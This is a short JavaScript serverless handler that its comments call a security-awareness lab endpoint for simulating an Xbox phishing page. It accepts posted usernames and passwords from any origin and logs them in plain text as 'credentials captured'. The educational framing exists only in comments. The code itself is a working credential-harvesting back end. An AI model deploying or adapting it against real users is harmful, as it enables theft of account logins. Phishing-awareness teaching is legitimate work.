// =====================================================================
//  SECURITY AWARENESS LAB - phishing simulation capture endpoint (Xbox)
//  Educational use only. Logs submitted credentials to the server logs
//  so a student can SEE what a credential-harvesting page collects.
//  The front-end immediately reveals the simulation to the victim.
//  Do NOT deploy against real users or real accounts.
// =====================================================================

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    // Parse the JSON body (Vercel may or may not auto-parse it).
    let body = {};
    if (req.body && typeof req.body === 'object') {
        body = req.body;
    } else if (typeof req.body === 'string') {
        try { body = JSON.parse(req.body); } catch (e) { body = {}; }
    } else {
        const buffers = [];
        for await (const chunk of req) buffers.push(chunk);
        const raw = Buffer.concat(buffers).toString();
        try { body = JSON.parse(raw); } catch (e) { body = {}; }
    }

    const username = body.user || 'Not Provided';
    const password = body.pass || 'Not Provided';

    // Demonstrates the capture step. Visible in Vercel Project -> Logs.
    console.log('\n=====================================');
    console.log('[LAB] XBOX PHISHING SIMULATION - CREDENTIALS CAPTURED');
    console.log(`USER : ${username}`);
    console.log(`PASS : ${password}`);
    console.log('Reminder: educational simulation only.');
    console.log('=====================================\n');

    return res.status(200).json({ status: 'captured', simulation: true });
}
